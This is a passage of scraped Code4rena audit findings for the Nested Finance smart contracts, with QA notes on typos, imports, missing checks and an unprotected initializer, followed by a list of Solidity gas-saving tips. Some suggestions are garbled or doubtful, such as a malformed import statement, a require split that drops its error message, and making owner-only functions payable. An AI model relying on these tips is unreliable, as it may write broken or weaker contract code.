```solidity     /// @param pool The Curve pool to add liquitiy in ``` Change `liquitiy` to `liquidity` in each case   The same typo (`orders`) occurs in both lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L346  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L393  ```solidity     /// @dev For every orders, call the operator with the calldata ``` Change `orders` to `order` in both cases   The same typo (`store`) occurs in both lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L397  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L457  ```solidity     /// @param _toReserve True if the output is store in the reserve/records (portfolio), false if not. ``` Change `store` to `stored` in both cases   https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L477 ```solidity     /// @dev Call the operator to submit the order but dont stop if the call to the operator fail. ``` Change `fail` to `fails`    https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L8 ```solidity /// @notice Resolve the operators address ``` For clarity, either replace `the operators` with `operator` or else use the actual variable name   https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/ExchangeHelpers.sol#L26 ```solidity     /// @dev sets the allowance for a token to the maximum if it is not already at max ``` For clarity and consistency, capitalize `sets`   The same typo (`token`) occurs in all six lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L83  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L124  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L128  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L83  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L124  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L128  Example:  ```solidity     /// @param token One of the paired token ``` Change `token` to `tokens` in each case   The same typo (`needs`) occurs in both lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L144  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L144  ```solidity         // LP Tokens needs to be sent back to the pair address to be burned ``` Change `needs` to `need` in both cases   The same typo (`allows to add`) occurs in both lines referenced below:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L260  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L260  ```solidity     ///         This allows to add as many tokensA and tokensB as possible ``` Change `allows to add` to `allows us to add` in both cases"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/40", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "# 1 . unused imports  ( its already imported) Ierc20 is already imported in  Inestedfactory.sol Feespliter.sol is already imported Inestedfactory.sol NestedReverse.sol is already imprted Insteadfactory.sol [NestedFactory:6]( https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L6) [NestedFactory:12]( https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L12) safeerc20 imports Ierc20 so you can take out Ierc20 when you import safeerc20.sol [NestedFactory:13]( https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L13) IOperatorResolver.sol is already imported in MixinOperatorResolver.sol take out IOperatorResolver.sol from OperatorResolver.sol [OperatorResolver:4](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L4) https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L10 https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L10 https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/operators/Paraswap/ParaswapOperator.sol#L6 safeerc20.sol is already in exchangehelper.sol https://github.com/code-423n4/2022-06-nested/blob/0dc44d779eaca8f40b7526aabdd81a098dcebf25/contracts/libraries/StakingLPVaultHelpers.sol#L10   # 2. Change your imports  ex: import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; instead do your imports like this  import {Ierc20,safeer20} from \"import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/NestedFactory.sol#L5 https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L10  # 3. no check that address can be zero in array of address  no check that token of i can be zero   address token = tokens[i]; instances:  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L257 https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/operators/Beefy/BeefyVaultOperator.sol#L18 https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L28   # 4. make  success variable in call function a check in a require statement . instead of a if statment where if success is  false it will just skip execution not revert.  make         if (success)  into:  require(success)   to make sure the call dosnt fail   https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/NestedFactory.sol#L518     # 5. initialize function should have onlyowner modifer anyone can front run the initialize call and become owner. If the initializer is not executed in the same transaction as the constructor, a malicious user can front-run the initialize() call, forcing the contract to be redeployed ex: function initialize(address ownerAddr) external { https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/abstracts/OwnableProxyDelegation.sol#L24  # 6. no check on success variable , if the call function fails bool success  variable should be  checked  with a require statement  if not logic can brake and cause loss of funds https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/libraries/ExchangeHelpers.sol#L22  # 7.typos  instead of : liquitiy  use : liquidity  https://github.com/code-423n4/2022-06-nested/blob/0dc44d779eaca8f40b7526aabdd81a098dcebf25/contracts/libraries/StakingLPVaultHelpers.sol#L52  https://github.com/code-423n4/2022-06-nested/blob/0dc44d779eaca8f40b7526aabdd81a098dcebf25/contracts/libraries/StakingLPVaultHelpers.sol#L85  https://github.com/code-423n4/2022-06-nested/blob/0dc44d779eaca8f40b7526aabdd81a098dcebf25/contracts/libraries/StakingLPVaultHelpers.sol#L115  # 8. Event is missing indexed fields  each event should use three indexed fields if there are there or more fields https://github.com/code-423n4/2022-06-nested/blob/b253ed80f67d1bb2a04e1702f5796fd96a7c521e/contracts/governance/TimelockControllerEmergency.sol#L50 "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## _minDelay can be 0, beating timelock motive  Contract: https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L93  Issue: In constructor, deployer can set _minDelay to 0 which means any proposed transaction can instantly be executed without any delay which beats the basic motive of timelock  Recommendation: Add a check to ensure correct value of _minDelay  ``` require(_minDelay!=0, \"Incorrect delay\"); ```  ## Missing selector check on operator  Contract: https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/scripts/OperatorScripts.sol#L28 https://github.com/code-423n4/2022-06-nested/blob/main/contracts/OperatorResolver.sol#L20  Issue: The addOperator function is not checking that selector of added operator is not bytes4(0) Same fix is required for requireAndGetOperator function at OperatorResolver.sol#L20  Recommendation: Add below check  ``` require(operator.selector != bytes4(0), \"AO-SCRIPT: INVALID_SELECTOR\"); ```  ## Unused imports  Contract: https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L12  Issue: Contract is importing CurveHelpers but not using it  Recommendation: Do not import CurveHelpers.sol in YearnCurveVaultOperator"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "# [G-01] Redundant zero initialization  Solidity does not recognize null as a value, so uint variables are initialized to zero. Setting a uint variable to zero is redundant and can waste gas.  There were many places where an int is initialized to zero https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L84 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L89 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L234 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L324 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L37 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L56 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L124 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L136 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L196 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L256 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L315 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L333 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L369 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L412 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L651 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L123 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L147 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L164 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L259 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L278 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L316 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedRecords.sol#L71 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedRecords.sol#L203 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L40 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L60 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L75  ## Recommended Mitigation Steps  Remove the redundant zero initialization `uint256 i;` instead of `uint256 i = 0;`  # [G-02] Split up require statements instead of &&  Combining require statement conditions with && logic uses unnecessary gas. It is better to split up each part of the logical statement into a separate require statements  One example is ``` require(_tokenTransferProxy != address(0) && _augustusSwapper != address(0), \"PSO: INVALID_ADDRESS\"); ```  This can be improved to ``` require(_tokenTransferProxy != address(0)); require(_augustusSwapper != address(0), \"PSO: INVALID_ADDRESS\"); ```  Several places had require statements with many logical \"and\"s. Instead, split into two to save gas https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Paraswap/ParaswapOperator.sol#L16 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L64 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L65 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L64 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L65 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L54 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedBuybacker.sol#L52 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L67 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L68 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L69 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L70 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L71 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L72  ## Recommended Mitigation Steps  Use separate require statements instead of concatenating with &&  # [G-03] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  This was found in many places https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L84 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L89 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L234 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L324 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L37 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L56 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L124 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L651 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L147 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L164 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L259 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L278 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L316 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L60 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L75  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-04] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L120  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-05] Short require strings save gas  Strings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.  Locations where this was found include https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L229 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L230 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L243 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L244 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L256 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L319 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L320 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L334 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L335 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L342 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L359 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L375  ## Recommended Mitigation Steps  Shorten all require strings to less than 32 characters  # [G-06] Use prefix not postfix in loops  Using a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.  There are many examples of this in for loops https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L42 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L27 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L27 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L18 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/scripts/OperatorScripts.sol#L67 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/scripts/OperatorScripts.sol#L80 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L84 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L89 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L234 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L324 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L37 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L56 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L124  ## Recommended Mitigation Steps  Use prefix not postfix to increment in a loop  # [G-07] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  There are many for loops and that can use this change https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L42 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L27 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L27 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L18 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/scripts/OperatorScripts.sol#L67 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/scripts/OperatorScripts.sol#L80 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L84 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L89 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L234 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L324 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L37 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L56 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L124  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-08] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  There are many places where a value is compared to zero https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L92 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L219 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedRecords.sol#L70  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-09] Add payable to functions that won't receive ETH  Identifying a function as payable saves gas. Functions that have a modifier like onlyOwner cannot be called by normal users and will not mistakenly receive ETH. These functions can be payable to save gas.  There are many functions that have the onlyOwner modifier in the contracts. Some examples are https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Yearn/YearnVaultStorage.sol#L29 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Yearn/YearnVaultStorage.sol#L41 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/BeefyVaultStorage.sol#L24 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/BeefyVaultStorage.sol#L34 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/OwnerProxy.sol#L16 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/OwnableFactoryHandler.sol#L27 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/OwnableFactoryHandler.sol#L35 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/OwnableProxyDelegation.sol#L50 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/OwnableProxyDelegation.sol#L56 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L116 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L122 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L129 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L136 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedBuybacker.sol#L61 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedBuybacker.sol#L69 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedBuybacker.sol#L77 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedBuybacker.sol#L91 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L121 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L133 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L152 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L159 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L167 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L175 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L106 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L116 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L131 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedRecords.sol#L52 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L56 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/OperatorResolver.sol#L74 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/mocks/TokenTransferProxy.sol#L40  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-10] Add payable to constructors that won't receive ETH  Identifying a constructor as payable saves gas. Constructors should only be called by the admin or deployer and should not mistakenly receive ETH. Constructors can be payable to save gas.  Some examples of constructors in the contracts are https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Paraswap/ParaswapOperator.sol#L15 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L31 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L21 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L21 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L13 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/scripts/OperatorScripts.sol#L18 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L65 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/Withdrawer.sol#L16 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/MixinOperatorResolver.sol#L22 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L37 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedBuybacker.sol#L45 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L57 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/FeeSplitter.sol#L84 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/utils/NestedAssetBatcher.sol#L32 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedRecords.sol#L44  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-11] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Many modifiers can use this change https://github.com/code-423n4/2022-06-nested/tree/main/contracts/governance/TimelockControllerEmergency.sol#L103 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/OwnableFactoryHandler.sol#L20 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/abstracts/OwnableProxyDelegation.sol#L40 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedAsset.sol#L42 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L98 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/NestedFactory.sol#L106  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-12] Use uint not bool  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  Locations where this was found include https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Paraswap/ParaswapOperator.sol#L34 https://github.com/code-423n4/2022-06-nested/tree/main/contracts/operators/Beefy/lp/"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/11", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## Missing Zero-address Validation **Severity**: Low **Context**: [`Withdrawer.sol#L16-L18`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/Withdrawer.sol#L16-L18), [`YearnCurveVaultOperator.sol#L31-L51`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L31-L51)  **Description**: Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.  **Recommendation**: Add explicit zero-address validation on input parameters of address type.   ## Missing Time locks **Severity**: Low **Context**: [`NestedFactory.sol#L121-L179`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L121-L179), [`BeefyVaultStorage.sol#L34-L38`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/BeefyVaultStorage.sol#L34-L38)  **Description**: When critical parameters of systems need to be changed, it is required to broadcast the change via event emission and recommended to enforce the changes after a time-delay. This is to allow system users to be aware of such critical changes and give them an opportunity to exit or adjust their engagement with the system accordingly. None of the onlyOwner functions that change critical protocol addresses/parameters have a timelock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and give them a chance to perform incident response.  **Recommendation**: Users may be surprised when critical parameters are changed or incentivizer programs completed early without notice. Furthermore, it can erode users' trust since they can\u2019t be sure the protocol rules won\u2019t be changed later on. Compromised owner keys may be used to change protocol addresses/parameters to benefit attackers. Without a time-delay, authorised owners have no time for any planned incident response.   ## Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`NestedFactory.sol#L152-L172`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L152-L172)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase 